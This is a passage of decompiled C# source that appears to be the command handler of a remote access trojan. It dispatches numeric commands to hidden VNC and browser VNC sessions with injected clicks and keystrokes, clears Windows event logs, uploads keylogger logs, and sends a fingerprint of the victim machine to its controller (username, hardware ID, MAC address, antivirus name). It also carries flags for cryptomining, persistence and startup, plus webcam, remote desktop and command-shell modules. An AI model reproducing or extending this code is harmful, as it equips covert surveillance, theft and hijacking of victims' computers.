						BrowserVNC.Initialize(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
						{
							2
						}, null)));
						BrowserVNC.MainRenderThread(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[]
						{
							1
						}, null)));
					}
					else if (Operators.ConditionalCompareObjectEqual(left, 47, false))
					{
						BrowserVNC.StopBrowserThread();
					}
					else if (Operators.ConditionalCompareObjectEqual(left, 48, false))
					{
						object left7 = NewLateBinding.LateIndexGet(obj, new object[]
						{
							1
						}, null);
						if (Operators.ConditionalCompareObjectEqual(left7, 0, false))
						{
							BrowserVNC.PostClickLD(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
							{
								2
							}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
							{
								3
							}, null)));
						}
						else if (Operators.ConditionalCompareObjectEqual(left7, 1, false))
						{
							BrowserVNC.PostClickLU(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
							{
								2
							}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
							{
								3
							}, null)));
						}
					}
					else if (!Operators.ConditionalCompareObjectEqual(left, 49, false))
					{
						if (Operators.ConditionalCompareObjectEqual(left, 50, false))
						{
							BrowserVNC.ResizeBrowser(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
							{
								1
							}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
							{
								2
							}, null)));
						}
						else if (Operators.ConditionalCompareObjectEqual(left, 51, false))
						{
							Functions.uploadserialized(Server.nstream, "51|" + BrowserVNC.returnbrowsers());
						}
						else if (Operators.ConditionalCompareObjectEqual(left, 52, false))
						{
							BrowserVNC.PostKeydown(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
							{
								1
							}, null)));
						}
						else if (Operators.ConditionalCompareObjectEqual(left, 53, false))
						{
							HVNC.StartHVNC(Conversions.ToString(Operators.ConcatenateObject("127.0.0.1 ", NewLateBinding.LateIndexGet(obj, new object[]
							{
								1
							}, null))));
						}
						else if (Operators.ConditionalCompareObjectEqual(left, 54, false))
						{
							HVNC.KillHVNC();
						}
						else if (Operators.ConditionalCompareObjectEqual(left, 55, false))
						{
							Functions.DeleteEvents();
						}
						else if (Operators.ConditionalCompareObjectEqual(left, 56, false))
						{
							Functions.uploadserialized(Server.nstream, "56|" + Clog.logs2.ToString());
						}
						else if (!Operators.ConditionalCompareObjectEqual(left, 57, false))
						{
							if (Operators.ConditionalCompareObjectEqual(left, 12345, false))
							{
								Functions.uploadserialized(Server.nstream, "Stop reading");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 54321, false))
							{
								Functions.uploadserialized(Server.nstream, string.Concat(new string[]
								{
									"54321|",
									CultureInfo.CurrentCulture.ToString().Substring(3, 2),
									"|",
									Environment.UserName,
									"|",
									Functions.getOSInfo(),
									"|NGD19|",
									Functions.userrole()
								}));
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 99999, false))
							{
								Functions.uploadserialized(Server.nstream, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("99999|" + CultureInfo.CurrentCulture.ToString() + "|" + Environment.UserName + "|" + Functions.getOSInfo() + "|" + (Conversions.ToString(Screen.PrimaryScreen.Bounds.Width) + " x " + Conversions.ToString(Screen.PrimaryScreen.Bounds.Height)) + "|", Functions.HWID()), "|"), Functions.getMacAddress()), "|"), CultureInfo.CurrentCulture.ToString()), "|"), Functions.CPUName()), "|"), Functions.GPUName()), "|"), Functions.AVName()), "|"), "NGD19"), "|"), Server.logging.ToString()), "|"), Server.mining.ToString()), "|"), Server.startup.ToString()), "|"), Server.persistence.ToString()), "|"), Functions.userrole()));
							}
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
		}
	}

	// Token: 0x0600000C RID: 12 RVA: 0x00004934 File Offset: 0x00002B34
	public static void endthreads()
	{
		try
		{
			Server.mousethread.Abort();
		}
		catch (Exception ex)
		{
		}
		try
		{
			Server.chatthread.Abort();
		}
		catch (Exception ex2)
		{
		}
		try
		{
			Webcam.endcam();
		}
		catch (Exception ex3)
		{
		}
		try
		{
			RemoteDesktop.endsc();
		}
		catch (Exception ex4)
		{
		}
		try
		{
			CMD.Close();
		}
		catch (Exception ex5)
		{
		}
		try
		{
			BrowserVNC.StopBrowserThread();
		}
		catch (Exception ex6)
		{
		}
		try
		{
			HVNC.KillHVNC();
		}
		catch (Exception ex7)
		{
		}
	}

	// Token: 0x04000001 RID: 1
	public static TcpClient Client = new TcpClient();

	// Token: 0x04000002 RID: 2
	public static NetworkStream nstream;

	// Token: 0x04000003 RID: 3
	public static Mutex objMutex;

	// Token: 0x04000004 RID: 4
	private static Thread chatthread = new Thread(new ThreadStart(Functions.showchatter));

	// Token: 0x04000005 RID: 5
	private static Thread mainthread = new Thread(new ThreadStart(Server.mainfrm));

	// Token: 0x04000006 RID: 6
	public static bool webcamenabled = false;

	// Token: 0x04000007 RID: 7
	public static byte[] DllRes;

	// Token: 0x04000008 RID: 8
	private static bool mining = true;

	// Token: 0x04000009 RID: 9
	private static bool startup = true;

	// Token: 0x0400000A RID: 10
	private static bool logging = false;

	// Token: 0x0400000B RID: 11
	private static bool emaillogs = false;

	// Token: 0x0400000C RID: 12
	public static bool screenlogs = false;

	// Token: 0x0400000D RID: 13
	public static bool encryptedconnection = true;

	// Token: 0x0400000E RID: 14
	public static int encryptionindex = 0;

	// Token: 0x0400000F RID: 15
	private static bool persistence = false;

	// Token: 0x04000010 RID: 16
	private static Thread mousethread = new Thread(new ThreadStart(Functions.showmouse));
}
